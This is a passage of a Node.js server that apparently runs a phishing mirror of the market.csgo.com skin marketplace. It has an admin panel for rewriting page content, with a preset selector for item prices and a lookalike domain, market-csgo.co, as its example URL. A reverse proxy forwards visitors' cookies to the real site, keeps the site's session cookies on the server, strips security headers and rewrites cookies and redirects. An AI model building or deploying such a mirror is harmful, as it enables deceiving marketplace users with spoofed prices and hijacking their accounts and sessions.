                    // –°–æ–∑–¥–∞–µ–º –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –¥–ª—è –ø—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä–∞, –µ—Å–ª–∏ –µ–≥–æ –Ω–µ—Ç
                    const container = document.createElement('div');
                    container.id = 'valuePreview';
                    container.className = 'mt-3 p-3 border rounded bg-light';
                    container.innerHTML = `
                        <h6 class="mb-2">–ü—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä –∑–Ω–∞—á–µ–Ω–∏—è:</h6>
                        <div class="preview-content">${value}</div>
                    `;
                    
                    const customValueInput = document.getElementById('customValue');
                    customValueInput.parentNode.appendChild(container);
                } else {
                    // –û–±–Ω–æ–≤–ª—è–µ–º —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä
                    const previewContent = previewContainer.querySelector('.preview-content');
                    if (previewContent) {
                        previewContent.innerHTML = value;
                    }
                }
            }
            
            // –ù–û–í–û–ï: –§—É–Ω–∫—Ü–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å–æ—Å—Ç–æ—è–Ω–∏—è –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π
            function checkModificationsStatus() {
                fetch('/admin-api/check-modifications-status')
                    .then(response => response.json())
                    .then(data => {
                        const statusBadge = document.getElementById('modificationsStatusBadge');
                        if (statusBadge) {
                            statusBadge.className = `badge ${data.active > 0 ? 'bg-success' : 'bg-secondary'}`;
                            statusBadge.textContent = `${data.active} –∞–∫—Ç–∏–≤–Ω—ã—Ö –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π`;
                            
                            const lastUpdate = new Date(data.lastUpdated).toLocaleString();
                            statusBadge.title = `–ü–æ—Å–ª–µ–¥–Ω–µ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ: ${lastUpdate}`;
                        }
                    })
                    .catch(error => {
                        console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ —Å—Ç–∞—Ç—É—Å–∞ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π:', error);
                    });
            }
            
            // –°–±—Ä–æ—Å –≤—Å–µ—Ö –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π
            async function resetAllCustomPages() {
                try {
                    const response = await fetch('/admin-api/reset-all-custom-pages', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({})
                    });
                    
                    if (!response.ok) {
                        const errorData = await response.json();
                        throw new Error(errorData.error || '–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–±—Ä–æ—Å–µ –≤—Å–µ—Ö –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π');
                    }
                    
                    showToast('–í—Å–µ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏ —É—Å–ø–µ—à–Ω–æ —Å–±—Ä–æ—à–µ–Ω—ã', 'success');
                    await loadCustomPages();
                } catch (error) {
                    console.error('–û—à–∏–±–∫–∞ —Å–±—Ä–æ—Å–∞:', error);
                    showToast('–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–±—Ä–æ—Å–µ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π: ' + error.message, 'danger');
                } finally {
                    resetAllModal.hide();
                }
            }
            
            // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—á–∏—Å—Ç–∫–∏ –∫–µ—à–∞
            function clearCache() {
                try {
                    fetch('/admin-api/clear-cache', { method: 'POST' })
                        .then(response => response.json())
                        .then(data => {
                            if (data.success) {
                                showToast('–ö–µ—à —É—Å–ø–µ—à–Ω–æ –æ—á–∏—â–µ–Ω', 'success');
                            } else {
                                showToast('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—á–∏—Å—Ç–∫–µ –∫–µ—à–∞: ' + (data.error || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞'), 'danger');
                            }
                        })
                        .catch(error => {
                            console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—á–∏—Å—Ç–∫–µ –∫–µ—à–∞:', error);
                            showToast('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—á–∏—Å—Ç–∫–µ –∫–µ—à–∞: ' + error.message, 'danger');
                        });
                } catch (error) {
                    console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—á–∏—Å—Ç–∫–µ –∫–µ—à–∞:', error);
                    showToast('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—á–∏—Å—Ç–∫–µ –∫–µ—à–∞: ' + error.message, 'danger');
                }
            }
            
            // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ —Å–æ–æ–±—â–µ–Ω–∏–π –æ—Ç —Ç–µ—Å—Ç–æ–≤–æ–≥–æ –æ–∫–Ω–∞
            window.addEventListener('message', (event) => {
                if (event.data && event.data.type === 'selectorTestResult') {
                    if (event.data.found) {
                        showToast(`‚úÖ –ù–∞–π–¥–µ–Ω–æ ${event.data.count} —ç–ª–µ–º–µ–Ω—Ç(–æ–≤) –ø–æ —Å–µ–ª–µ–∫—Ç–æ—Ä—É!`, 'success');
                        
                        // –î–æ–±–∞–≤–ª—è–µ–º –≤–∏–∑—É–∞–ª—å–Ω—É—é –∏–Ω–¥–∏–∫–∞—Ü–∏—é —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–∏—è —Ç–µ–∫—É—â–µ–≥–æ –∑–Ω–∞—á–µ–Ω–∏—è –∏ –Ω–æ–≤–æ–≥–æ
                        const customValueInput = document.getElementById('customValue');
                        if (customValueInput && event.data.currentValue) {
                            // –û—Ç–æ–±—Ä–∞–∂–∞–µ–º —Ç–µ–∫—É—â–µ–µ –∑–Ω–∞—á–µ–Ω–∏–µ
                            const currentValueDisplay = document.createElement('div');
                            currentValueDisplay.className = 'alert alert-info mt-2';
                            currentValueDisplay.innerHTML = `
                                <strong>–¢–µ–∫—É—â–µ–µ –∑–Ω–∞—á–µ–Ω–∏–µ:</strong>
                                <pre class="mt-2 p-2 bg-light">${event.data.currentValue.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>
                                <button class="btn btn-sm btn-outline-primary mt-2" id="useCurrent">–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫–∞–∫ –æ—Å–Ω–æ–≤—É</button>
                            `;
                            
                            // –£–¥–∞–ª—è–µ–º –ø—Ä–µ–¥—ã–¥—É—â–µ–µ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ, –µ—Å–ª–∏ –æ–Ω–æ –µ—Å—Ç—å
                            const existingDisplay = document.getElementById('currentValueDisplay');
                            if (existingDisplay) {
                                existingDisplay.remove();
                            }
                            
                            // –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤–æ–µ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ
                            currentValueDisplay.id = 'currentValueDisplay';
                            customValueInput.parentNode.appendChild(currentValueDisplay);
                            
                            // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –∫–Ω–æ–ø–∫–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —Ç–µ–∫—É—â–µ–≥–æ –∑–Ω–∞—á–µ–Ω–∏—è
                            document.getElementById('useCurrent').addEventListener('click', () => {
                                customValueInput.value = event.data.currentValue;
                                previewModification();
                                currentValueDisplay.remove();
                            });
                        }
                    } else {
                        showToast(`‚ö†Ô∏è –≠–ª–µ–º–µ–Ω—Ç—ã –ø–æ —É–∫–∞–∑–∞–Ω–Ω–æ–º—É —Å–µ–ª–µ–∫—Ç–æ—Ä—É –Ω–µ –Ω–∞–π–¥–µ–Ω—ã. ${event.data.error || ''}`, 'warning');
                    }
                } else if (event.data && event.data.type === 'useNewSelector') {
                    // –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤—ã–±—Ä–∞–ª –Ω–æ–≤—ã–π —Å–µ–ª–µ–∫—Ç–æ—Ä –≤ —Ç–µ—Å—Ç–æ–≤–æ–º –æ–∫–Ω–µ
                    const selectorInput = document.getElementById('cssSelector');
                    selectorInput.value = event.data.selector;
                    
                    showToast(`‚úÖ –°–µ–ª–µ–∫—Ç–æ—Ä –æ–±–Ω–æ–≤–ª–µ–Ω –Ω–∞ –±–æ–ª–µ–µ –Ω–∞–¥–µ–∂–Ω—ã–π: ${event.data.selector}`, 'success');
                    
                    // –û—Ç–æ–±—Ä–∞–∂–∞–µ–º —Ç–µ–∫—É—â–µ–µ –∑–Ω–∞—á–µ–Ω–∏–µ
                    const customValueInput = document.getElementById('customValue');
                    if (customValueInput && event.data.currentValue) {
                        // –£–¥–∞–ª—è–µ–º –ø—Ä–µ–¥—ã–¥—É—â–µ–µ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ, –µ—Å–ª–∏ –æ–Ω–æ –µ—Å—Ç—å
                        const existingDisplay = document.getElementById('currentValueDisplay');
                        if (existingDisplay) {
                            existingDisplay.remove();
                        }
                        
                        // –°–æ–∑–¥–∞–µ–º –Ω–æ–≤–æ–µ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ
                        const currentValueDisplay = document.createElement('div');
                        currentValueDisplay.className = 'alert alert-success mt-2';
                        currentValueDisplay.innerHTML = `
                            <strong>–¢–µ–∫—É—â–µ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –ø–æ –Ω–æ–≤–æ–º—É —Å–µ–ª–µ–∫—Ç–æ—Ä—É:</strong>
                            <pre class="mt-2 p-2 bg-light">${event.data.currentValue.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>
                            <button class="btn btn-sm btn-outline-primary mt-2" id="useCurrent">–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫–∞–∫ –æ—Å–Ω–æ–≤—É</button>
                        `;
                        
                        // –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤–æ–µ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ
                        currentValueDisplay.id = 'currentValueDisplay';
                        customValueInput.parentNode.appendChild(currentValueDisplay);
                        
                        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –∫–Ω–æ–ø–∫–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —Ç–µ–∫—É—â–µ–≥–æ –∑–Ω–∞—á–µ–Ω–∏—è
                        document.getElementById('useCurrent').addEventListener('click', () => {
                            customValueInput.value = event.data.currentValue;
                            previewModification();
                            currentValueDisplay.remove();
                        });
                    }
                }
            });
            
            // –î–æ–±–∞–≤–ª—è–µ–º –ø–æ–¥–¥–µ—Ä–∂–∫—É –¥–ª—è URL —Å —à–∞–±–ª–æ–Ω–∞–º–∏
            document.getElementById('pageUrl').addEventListener('change', function() {
                const urlInput = document.getElementById('pageUrl');
                const url = urlInput.value.trim();
                
                // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —Å–æ–¥–µ—Ä–∂–∏—Ç –ª–∏ URL –ø–∞—Ä–∞–º–µ—Ç—Ä id=
                if (url.includes('id=')) {
                    const idMatch = /id=([0-9]+)/.exec(url);
                    if (idMatch && idMatch[1]) {
                        const baseUrl = url.split('?')[0];
                        const id = idMatch[1];
                        
                        // –ü—Ä–µ–¥–ª–∞–≥–∞–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —à–∞–±–ª–æ–Ω
                        const templateSuggestion = document.createElement('div');
                        templateSuggestion.className = 'alert alert-info mt-2';
                        templateSuggestion.innerHTML = `
                            <strong>–°–æ–≤–µ—Ç:</strong> –í—ã –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —à–∞–±–ª–æ–Ω –¥–ª—è –≤—Å–µ—Ö —Ç–æ–≤–∞—Ä–æ–≤ —ç—Ç–æ–≥–æ —Ç–∏–ø–∞:<br>
                            <code>${baseUrl}*</code>
                            <button class="btn btn-sm btn-outline-primary mt-2" id="useTemplate">–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —à–∞–±–ª–æ–Ω</button>
                        `;
                        
                        // –£–¥–∞–ª—è–µ–º –ø—Ä–µ–¥—ã–¥—É—â–µ–µ –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏–µ, –µ—Å–ª–∏ –æ–Ω–æ –µ—Å—Ç—å
                        const existingSuggestion = document.getElementById('templateSuggestion');
                        if (existingSuggestion) {
                            existingSuggestion.remove();
                        }
                        
                        // –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤–æ–µ –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏–µ
                        templateSuggestion.id = 'templateSuggestion';
                        urlInput.parentNode.appendChild(templateSuggestion);
                        
                        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –∫–Ω–æ–ø–∫–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —à–∞–±–ª–æ–Ω–∞
                        document.getElementById('useTemplate').addEventListener('click', () => {
                            urlInput.value = `${baseUrl}*`;
                            templateSuggestion.remove();
                        });
                    }
                }
            });
            
            // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
            document.addEventListener('DOMContentLoaded', () => {
                // –ó–∞–≥—Ä—É–∂–∞–µ–º —Å–ø–∏—Å–æ–∫ –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Å—Ç—Ä–∞–Ω–∏—Ü
                loadCustomPages();
                
                // –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ —Å–æ–±—ã—Ç–∏–π
                form.addEventListener('submit', saveCustomPage);
                confirmDeleteBtn.addEventListener('click', deleteCustomPage);
                confirmResetAllBtn.addEventListener('click', resetAllCustomPages);
                resetAllBtn.addEventListener('click', () => resetAllModal.show());
                testButton.addEventListener('click', testSelector);
                
                // –î–æ–±–∞–≤–ª—è–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –∫–Ω–æ–ø–∫–∏ —Å–±—Ä–æ—Å–∞ –∫–µ—à–∞
                const refreshCacheBtn = document.getElementById('refreshCacheBtn');
                if (refreshCacheBtn) {
                    refreshCacheBtn.addEventListener('click', clearCache);
                }
                
                // –î–æ–±–∞–≤–ª—è–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –ø—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –∑–Ω–∞—á–µ–Ω–∏—è
                customValueInput.addEventListener('input', previewModification);
                
                // –î–æ–±–∞–≤–ª—è–µ–º –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä —Å–æ—Å—Ç–æ—è–Ω–∏—è –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π
                const cardHeader = document.querySelector('.card-header h5.card-title');
                if (cardHeader) {
                    const statusBadge = document.createElement('span');
                    statusBadge.id = 'modificationsStatusBadge';
                    statusBadge.className = 'badge bg-secondary ms-2';
                    statusBadge.textContent = '–ü—Ä–æ–≤–µ—Ä–∫–∞...';
                    cardHeader.appendChild(statusBadge);
                    
                    // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ç–µ–∫—É—â–µ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ
                    checkModificationsStatus();
                    
                    // –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∏ –ø—Ä–æ–≤–µ—Ä—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ
                    setInterval(checkModificationsStatus, 10000);
                }
                
                // –î–æ–±–∞–≤–ª—è–µ–º –ø—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã, –µ—Å–ª–∏ –µ—Å—Ç—å –∑–Ω–∞—á–µ–Ω–∏–µ
                if (customValueInput && customValueInput.value) {
                    previewModification();
                }
                
                // –î–æ–±–∞–≤–ª—è–µ–º –ø–æ–¥—Å–∫–∞–∑–∫–∏ –¥–ª—è –∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è —Ñ–æ—Ä–º—ã
                const urlPattern = document.createElement('div');
                urlPattern.className = 'form-text mt-1';
                urlPattern.innerHTML = '<strong>–°–æ–≤–µ—Ç:</strong> –í—ã –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å * –∫–∞–∫ –ø–æ–¥—Å—Ç–∞–Ω–æ–≤–æ—á–Ω—ã–π –∑–Ω–∞–∫ –¥–ª—è —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–∏—è –Ω–µ—Å–∫–æ–ª—å–∫–∏–º URL. –ù–∞–ø—Ä–∏–º–µ—Ä: <code>https://market-csgo.co/ru/Gloves/*</code>';
                
                const urlInput = document.getElementById('pageUrl');
                if (urlInput && urlInput.parentNode) {
                    urlInput.parentNode.appendChild(urlPattern);
                }
                
                // –î–æ–±–∞–≤–ª—è–µ–º –∫–Ω–æ–ø–∫—É "–û—á–∏—Å—Ç–∏—Ç—å —Ñ–æ—Ä–º—É"
                const formActions = document.querySelector('#customPageForm .btn-primary').parentNode;
                
                const resetButton = document.createElement('button');
                resetButton.type = 'button';
                resetButton.className = 'btn btn-outline-secondary ms-2';
                resetButton.textContent = '–û—á–∏—Å—Ç–∏—Ç—å —Ñ–æ—Ä–º—É';
                resetButton.addEventListener('click', function() {
                    document.getElementById('customPageForm').reset();
                    
                    // –£–¥–∞–ª—è–µ–º –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã
                    const currentValueDisplay = document.getElementById('currentValueDisplay');
                    if (currentValueDisplay) currentValueDisplay.remove();
                    
                    const templateSuggestion = document.getElementById('templateSuggestion');
                    if (templateSuggestion) templateSuggestion.remove();
                    
                    const valuePreview = document.getElementById('valuePreview');
                    if (valuePreview) valuePreview.remove();
                });
                
                if (formActions) {
                    formActions.appendChild(resetButton);
                }
                
                // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –∫–Ω–æ–ø–∫–∞ –¥–ª—è —É–ø—Ä–æ—â–µ–Ω–Ω–æ–≥–æ —Å–µ–ª–µ–∫—Ç–æ—Ä–∞ —Ü–µ–Ω—ã
                const selectorInput = document.getElementById('cssSelector');
                if (selectorInput) {
                    const selectorHelpText = selectorInput.nextElementSibling;
                    
                    const simplifyButton = document.createElement('button');
                    simplifyButton.type = 'button';
                    simplifyButton.className = 'btn btn-sm btn-outline-success mt-2';
                    simplifyButton.textContent = '–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —É–ø—Ä–æ—â–µ–Ω–Ω—ã–π —Å–µ–ª–µ–∫—Ç–æ—Ä –¥–ª—è —Ü–µ–Ω—ã';
                    simplifyButton.addEventListener('click', function() {
                        selectorInput.value = 'app-page-inventory-price > div > span:first-child';
                        
                        showToast('‚úÖ –£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω —É–ø—Ä–æ—â–µ–Ω–Ω—ã–π —Å–µ–ª–µ–∫—Ç–æ—Ä –¥–ª—è —Ü–µ–Ω—ã', 'success');
                    });
                    
                    // –î–æ–±–∞–≤–ª—è–µ–º –∫–Ω–æ–ø–∫—É –ø–æ—Å–ª–µ –ø–æ–¥—Å–∫–∞–∑–∫–∏
                    if (selectorHelpText) {
                        selectorHelpText.appendChild(document.createElement('br'));
                        selectorHelpText.appendChild(simplifyButton);
                    } else {
                        selectorInput.parentNode.appendChild(simplifyButton);
                    }
                }
            });
        </script>
    </body>
    </html>
    `;
    
    res.send(html);
});

// –ò–°–ü–†–ê–í–õ–ï–ù–û: –£–ª—É—á—à–µ–Ω –æ—Å–Ω–æ–≤–Ω–æ–π –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ HTTP –∑–∞–ø—Ä–æ—Å–æ–≤ —Å –ø–æ–≤—Ç–æ—Ä–Ω—ã–º–∏ –ø–æ–ø—ã—Ç–∫–∞–º–∏
app.use('*', async (req, res, next) => {
    try {
        // –ü—Ä–æ–ø—É—Å–∫–∞–µ–º –∑–∞–ø—Ä–æ—Å—ã –∫ –∞–¥–º–∏–Ω–∫–µ –∏ API
        if (req.originalUrl.startsWith('/adminka') || req.originalUrl.startsWith('/admin-api')) {
            return next();
        }
        
        const baseUrl = getBaseUrl(req);
        const targetUrl = TARGET_HOST + req.originalUrl;
        const sessionId = req.cookies.sessionId || Math.random().toString(36).substring(7);
        const session = getSession(sessionId);
        
        // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º sessionId –µ—Å–ª–∏ –µ–≥–æ –Ω–µ—Ç
        if (!req.cookies.sessionId) {
            res.cookie('sessionId', sessionId, { 
                httpOnly: true, 
                secure: isSecure(req),
                sameSite: isSecure(req) ? 'none' : 'lax'
            });
        }
        
        // –°–æ–±–∏—Ä–∞–µ–º cookies –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞
        const requestCookies = new Map([
            ...session.cookies,
            ...parseCookieHeader(req.headers.cookie)
        ]);
        
        console.log(`üåê ${req.method} ${req.originalUrl} (${isSecure(req) ? 'HTTPS' : 'HTTP'})`);
        
        // –ò–°–ü–†–ê–í–õ–ï–ù–û: –£–ª—É—á—à–µ–Ω–Ω—ã–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –¥–ª—è axios
        const axiosConfig = {
            method: req.method,
            url: targetUrl,
            headers: {
                ...req.headers,
                'host': 'market.csgo.com',
                'origin': 'https://market.csgo.com',
                'referer': 'https://market.csgo.com/',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': req.headers['user-agent'] || 'Mozilla/5.0',
                'cookie': createCookieString(requestCookies),
                'connection': 'keep-alive'
            },
            data: req.body,
            responseType: 'arraybuffer',
            validateStatus: () => true,
            maxRedirects: 0,
            decompress: true,
            httpsAgent: httpsAgent,
            timeout: 30000
        };
        
        // –£–¥–∞–ª—è–µ–º –∑–∞–≥–æ–ª–æ–≤–∫–∏ –ø—Ä–æ–∫—Å–∏
        delete axiosConfig.headers['x-forwarded-for'];
        delete axiosConfig.headers['x-forwarded-proto'];
        delete axiosConfig.headers['x-forwarded-host'];
        delete axiosConfig.headers['x-real-ip'];
        delete axiosConfig.headers['cf-connecting-ip'];
        delete axiosConfig.headers['cf-ipcountry'];
        
        // –ò–°–ü–†–ê–í–õ–ï–ù–û: –î–æ–±–∞–≤–ª—è–µ–º –ø–æ–≤—Ç–æ—Ä–Ω—ã–µ –ø–æ–ø—ã—Ç–∫–∏ –¥–ª—è –∫—Ä–∏—Ç–∏—á–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤
        let retries = 0;
        const maxRetries = 3;
        let response = null;
        let lastError = null;
        
        // –û–ø—Ä–µ–¥–µ–ª—è–µ–º, —Ç—Ä–µ–±—É—é—Ç—Å—è –ª–∏ –ø–æ–≤—Ç–æ—Ä–Ω—ã–µ –ø–æ–ø—ã—Ç–∫–∏ –¥–ª—è —ç—Ç–æ–≥–æ –∑–∞–ø—Ä–æ—Å–∞
        const isRetryableRequest = (
            req.originalUrl.includes('/js/chunk-') || 
            req.originalUrl.includes('/api/') ||
            req.originalUrl.includes('/graphql') ||
            req.method === 'POST'
        );
        
        const maxRetriesForThisRequest = isRetryableRequest ? maxRetries : 1;
        
        while (retries < maxRetriesForThisRequest) {
            try {
                if (retries > 0) {
                    console.log(`Retry ${retries}/${maxRetriesForThisRequest} for ${req.originalUrl}`);
                    await new Promise(resolve => setTimeout(resolve, 1000 * retries)); // –£–≤–µ–ª–∏—á–∏–≤–∞—é—â–∞—è—Å—è –∑–∞–¥–µ—Ä–∂–∫–∞
                }
                
                response = await axios(axiosConfig);
                
                // –ï—Å–ª–∏ —É—Å–ø–µ—à–Ω–æ, –≤—ã—Ö–æ–¥–∏–º –∏–∑ —Ü–∏–∫–ª–∞
                if (response.status !== 500 || !isRetryableRequest) {
                    break;
                }
                
                console.warn(`Request returned 500, retry ${retries + 1}/${maxRetriesForThisRequest}`);
                retries++;
                
            } catch (error) {
                console.error(`Request failed (attempt ${retries + 1}/${maxRetriesForThisRequest}):`, error.message);
                lastError = error;
                retries++;
                
                if (retries >= maxRetriesForThisRequest) {
                    throw error;
                }
            }
        }
        
        // –ï—Å–ª–∏ –Ω–µ —Å–º–æ–≥–ª–∏ –ø–æ–ª—É—á–∏—Ç—å –æ—Ç–≤–µ—Ç –ø–æ—Å–ª–µ –≤—Å–µ—Ö –ø–æ–ø—ã—Ç–æ–∫
        if (!response) {
            throw lastError || new Error('Failed after max retries');
        }
        
        // –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ä–µ–¥–∏—Ä–µ–∫—Ç–æ–≤
        if ([301, 302, 303, 307, 308].includes(response.status)) {
            let location = response.headers.location;
            if (location) {
                if (location.includes('market.csgo.com')) {
                    location = location.replace(/https?:\/\/market\.csgo\.com/, baseUrl);
                } else if (location.startsWith('/')) {
                    location = baseUrl + location;
                }
                console.log(`‚Ü™Ô∏è Redirect: ${location}`);
                return res.redirect(response.status, location);
            }
        }
        
        // –°–æ—Ö—Ä–∞–Ω—è–µ–º cookies –∏–∑ –æ—Ç–≤–µ—Ç–∞
        if (response.headers['set-cookie']) {
            const newCookies = parseSetCookieHeaders(response.headers['set-cookie']);
            newCookies.forEach((value, name) => {
                session.cookies.set(name, value);
            });
        }
        
        // –ú–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è –∫–æ–Ω—Ç–µ–Ω—Ç–∞
        let content = response.data;
        const contentType = response.headers['content-type'] || '';
        
        if (contentType.includes('text/') || 
            contentType.includes('application/javascript') || 
            contentType.includes('application/json') ||
            contentType.includes('application/xml')) {
            
            // –ò–°–ü–†–ê–í–õ–ï–ù–û: –°–ø–µ—Ü–∏–∞–ª—å–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ –¥–ª—è –ø—Ä–æ–±–ª–µ–º–Ω—ã—Ö JS —Ñ–∞–π–ª–æ–≤
            if (contentType.includes('javascript') && 
                (req.originalUrl.includes('chunk-FWBJZS6X.js') || 
                 req.originalUrl.includes('chunk-'))) {
                console.log('Applying special modifications for JS chunk:', req.originalUrl);
            }
            
            content = Buffer.from(modifyUrls(content.toString('utf8'), baseUrl, contentType), 'utf8');
        }

        // –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤ –æ—Ç–≤–µ—Ç–∞
        const responseHeaders = { ...response.headers };

        // –£–¥–∞–ª—è–µ–º –Ω–µ–±–µ–∑–æ–ø–∞—Å–Ω—ã–µ –∑–∞–≥–æ–ª–æ–≤–∫–∏
        delete responseHeaders['content-security-policy'];
        delete responseHeaders['x-frame-options'];
        delete responseHeaders['x-content-type-options'];
        delete responseHeaders['strict-transport-security'];
        delete responseHeaders['permissions-policy'];
        delete responseHeaders['cross-origin-opener-policy'];
        delete responseHeaders['cross-origin-embedder-policy'];

        // –î–æ–±–∞–≤–ª—è–µ–º –∑–∞–≥–æ–ª–æ–≤–∫–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –¥–ª—è HTTPS
        if (isSecure(req)) {
            responseHeaders['content-security-policy'] = "upgrade-insecure-requests";
        }

        // –ú–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è set-cookie
        if (responseHeaders['set-cookie']) {
            responseHeaders['set-cookie'] = responseHeaders['set-cookie'].map(cookie => {
                return cookie
                    .replace(/domain=.*?(;|$)/gi, '')
                    .replace(/secure;/gi, isSecure(req) ? 'secure;' : '')
                    .replace(/samesite=none/gi, isSecure(req) ? 'samesite=none' : 'samesite=lax');
            });
        }

        // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∑–∞–≥–æ–ª–æ–≤–∫–∏
        Object.entries(responseHeaders).forEach(([key, value]) => {
            if (key.toLowerCase() !== 'content-encoding' && key.toLowerCase() !== 'content-length') {
                res.set(key, value);
            }
        });

        res.set('content-length', content.length);
        res.status(response.status);
        res.send(content);

    } catch (error) {
        console.error('‚ùå Proxy error:', error.message);
        res.status(500).json({ 
            error: 'Proxy Error', 
            message: error.message,
            stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
        });
    }
});

// –ò–°–ü–†–ê–í–õ–ï–ù–û: –û–±—Ä–∞–±–æ—Ç–∫–∞ GraphQL –∑–∞–ø—Ä–æ—Å–æ–≤ —Å –ø–æ–≤—Ç–æ—Ä–Ω—ã–º–∏ –ø–æ–ø—ã—Ç–∫–∞–º–∏
app.post('/api/graphql', async (req, res) => {
    try {
        const targetUrl = TARGET_HOST + '/api/graphql';
        const baseUrl = getBaseUrl(req);
        const sessionId = req.cookies.sessionId || Math.random().toString(36).substring(7);
        const session = getSession(sessionId);
        
        // –°–æ–±–∏—Ä–∞–µ–º cookies –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞
        const requestCookies = new Map([
            ...session.cookies,
            ...parseCookieHeader(req.headers.cookie)
        ]);
        
        console.log(`üìä GraphQL: ${req.method} ${req.originalUrl}`);
        
        // –ò–°–ü–†–ê–í–õ–ï–ù–û: –£–ª—É—á—à–µ–Ω–Ω—ã–µ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –¥–ª—è GraphQL
        const axiosConfig = {
            method: req.method,
            url: targetUrl,
            headers: {
                ...req.headers,
                'host': 'market.csgo.com',
